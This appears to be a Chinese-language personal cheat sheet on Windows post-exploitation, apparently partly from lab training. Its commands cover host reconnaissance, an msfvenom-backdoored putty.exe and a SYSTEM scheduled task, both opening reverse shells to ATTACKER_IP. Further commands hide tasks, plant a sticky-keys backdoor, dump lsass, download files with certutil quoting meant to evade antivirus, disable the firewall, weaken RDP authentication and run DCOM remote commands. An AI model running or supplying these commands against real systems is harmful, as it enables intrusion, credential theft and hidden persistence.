# 信息收集

## 本机信息收集

```cmd
# 用户列表：windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户
net user /domain

# 进程列表：分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等
tasklist /svc

# 端口列表：开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集
netstat -ano

# 补丁列表：分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞
systeminfo

# 本机共享：本机共享列表/访问权限 本机访问的域共享/访问权限
smbclient -L ip  
net view \\ip

# 敏感信息：查看安装程序和版本信息，浏览器，通讯软件，各类密码收集
wmic product get name,version
findstr /sim 'password' *.txt *.xml *.docx *.php # 递归搜索当前目录下的文件
```



## 网络拓扑收集

```cmd
# 网卡
ipconfig /all

# 路由
route print

# arp缓存
arp -a
```



## 域信息收集

```cmd

```







# 权限维持

## 添加后门用户

### RID劫持



## 后门文件

### 篡改exe

通过msf向exe中植入载荷

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

实验失败



### 篡改快捷方式

将快捷方式的属性值指向恶意文件

```cmd
powershell.exe -WindowStyle hidden C:\Users\khaz\Desktop\calc.ps1
```

![image-20231117105520136](E:/blog/source/images/image-20231117105520136.png)

但是powershel窗口会一闪而过



### 劫持文件关联



### 创建**Windows 任务计划程序**

```cmd
# 创建任务计划
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

> /sc minute /mo 1：一分钟执行一次
>
> /tn  <name>：任务计划名称
>
> /tr <cmd>：执行的命令
>
> /ru <user>：以什么权限运行

```cmd
# 查询任务计划
schtasks /query
```

隐藏任务计划

> **我们可以通过删除其安全描述符（SD）**使任务计划对系统中的任何用户不可见。
>
> 所有计划任务的安全描述符都存储在`计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`中名为“SD”的值

![image-20231117111429781](E:/blog/source/images/image-20231117111429781.png)



### 添加自启动项

启动项目录

```cmd
# 特定用户登录时
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# 任意用户登录时
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

注册表启动项

```cmd
# 当前用户登录时
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
# 任意用户登录时
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

新建一个值

![image-20231117112136859](E:/blog/source/images/image-20231117112136859.png)



### RDP后门

拥有RDP权限，在对方锁屏并不知道密码时仍可以使用终端的方法

- 粘滞键

  > 连续按下`SHIFT`5 次后，Windows 将执行`C:\Windows\System32\sethc.exe`.
  >
  > ![粘滞键](E:/blog/source/images/27e711818bea549ace3cf85279f339c8.png)

  将sethc替换为cmd

  ```cmd
  C:\> takeown /f c:\Windows\System32\sethc.exe
  
  SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".
  
  C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
  processed file: C:\Windows\System32\sethc.exe
  Successfully processed 1 files; Failed processing 0 files
  
  C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
  Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
          1 file(s) copied.
  ```

  



# 本机信息收集

```cmd
# 网卡
ipconfig /all

# 路由
route print

# arp缓存
arp -a

# 域，补丁，系统型号
systeminfo

# 查看安装程序和版本信息
wmic product get name,version

# 进程
tasklist
```





# Windows命令

## dump内存

```cmd
# 查看LsassPi

# 命令行
procdump.exe   -r -ma  lsass.exe  output_name # 默认保存到当前路径下的output_name.dmp
sqldump.exe LsassPid 0 0x01100

# 图形界面
任务管理器-详细信息(detail)-右键转储-默认保存到C:\Users\xxx\AppData\Local\Temp\下
process explore-右键转储

```



## 文件操作

- 文件传输

  - 原生命令

    ```cmd
    powershell -c "(new-object System.Net.WebClient).DownloadFile('<remote_file>','<file>')"
    powershell (new-object System.Net.WebClient).DownloadFile('<remote_file>','<file>')
    
    bitsadmin /transfer n <remote_file> <绝对路径>
    
    certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
    
    绕过火绒下载文件，单词加双引号，中间可以插入任意数量的成对双引号
    "c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f https://url/1.exe 1.exe
    ```

  - 小工具

    ```cmd
    echo y | pscp.exe -pw ssh密码 -P ssh端口  "单个文件路径"    user@ip:保存路径
    echo y | pscp.exe -pw ssh密码 -P ssh端口  -r "目录路径"    user@ip:保存路径
    ```

- 文件/目录查找

  ```cmd
  # 列出所有文件
  dir /b /s c:\ > c.txt
  
  # 查找文件
  dir c:\ /s /b | find "win.ini"
  
  # 递归搜索E盘，后缀为exe，修改日期>=2023/12/16的文件
  FORFILES /P E:\ /S /M *.exe /C "cmd /c echo @path" /D +2023/12/16 > res.txt
  ```

- 文件写入

  ```cmd
  echo "" >> shell.php
  ```

  ```cmd
  certutil编码文件 certutil -encode 1.txt output.txt
  certutil解码文件 certutil -decode output.txt input.txt
  ```

  ```cmd
  powershell -c "'文件内容' | Out-File input.txt -Append"
  
  # 写入
  powershell -c "add-content 文件 -value \"文件内容\""
  # 去除换行
  powershell "-join((gc -LiteralPath \"文件\"))"
  ```

- 解压缩

  - windows自带命令

    单个文件

    ```cmd
    # 解压
    expand -r file.zip extract_path
    
    # 压缩
    makecab 1.txt 1.zip
    ```

    多文件

    ```cmd
    # 假设现有文件夹test
    E:\test\文件1.txt
    E:\test\文件2.txt
    E:\test\abc\文件3.txt
    
    #要压缩整个文件夹需要将test下所有文件列一个清单，比如E:\list.txt：
    test\文件1.txt
    test\文件2.txt
    test\abc\文件3.txt
    
    # 执行压缩，最后生成一个cab文件，改后缀为zip即可，而且生成的zip内部文件全部在同一个文件夹下
    makecab /f F:\list.txt
    
    #解压（输出文件夹必须存在，否则不成功）：
    expand -F:* test.zip E:\output\
    ```

  - Rar64.exe

    ```cmd
    压缩文件夹（不包含子目录）：
    rar.exe a "压缩包保存路径文件名" "被压缩的文件夹路径"
    
    压缩文件夹（包含子目录）：
    rar.exe a -r "压缩包保存路径文件名" "被压缩的文件夹路径"
    
    压缩文件夹（以时间命名压缩包）：
    rar.exe a -ag -r -s -ibck "压缩包保存路径（记得在最后加\）" "被压缩的文件夹路径"
    ```

  - 7z.exe

    ```cmd
    7z a -mx -myx -mmt=off -ms=on -mtm=off -mtc=off -mta=off -mtr=off -m0=LZMA:d=384m:fb=273:lc=8 -mmc=1000000000 -- "压缩包保存路径文件名" "Users\*"
    ```



## 防火墙操作

使用命令行管理 Windows 防火墙 - Windows Security | Microsoft Learn
https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd

```cmd
# 高版本系统
netsh advfirewall firewall
netsh firewall

# 低版本系统
netsh firewall
```

```cmd
# 查看防火墙规则
netsh firewall show config
netsh firewall show state

# 开启防火墙
netsh advfirewall set allprofiles state on
# 关闭防火墙
netsh advfirewall set allprofiles state off
```



## 注册表操作





## 日志操作





## Powershell命令

```cmd
# 查看Powershell历史命令
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


```



## 常用的系统变量

```
查看当前用户目录%HOMEPATH
查看当前目录%CD%
列出用户共享主目录的网络路径%HOMESHARE%
列出有效的当前登录会话的域名控制器名
列出了可执行文件的搜索路径%Path%
列出了处理器的芯片架构%PROCESSOR_ARCHITECTURE%
列出了Program Files文件夹的路径%ProgramFiles%
列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%
列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%
列出了包含用户帐号的域的名字%USERDOMAIN%
列出操作系统目录的位置%WINDIR%
返回“所有用户”配置文件的位置%ALLUSERSPROFILE%
返回处理器数目%NUMBER_OF_PROCESSORS%
powershell地址%PSModulePath%
```





## 计划任务

**Windows Server 2012 以后的版本没有at命令，只有schtasks命令**





## RDP远程桌面

```cmd
# 连接rdp
win+r mstsc

# 查询注册表，若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 

# 开启远程桌面 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 

# 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0  

# 设置防火墙策略放行3389端口 
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```



## DCOM组件执行命令

```cmd
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IP"))

# 第三个参数Minimized用于隐藏cmd窗口
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c <command>","Minimized")
```



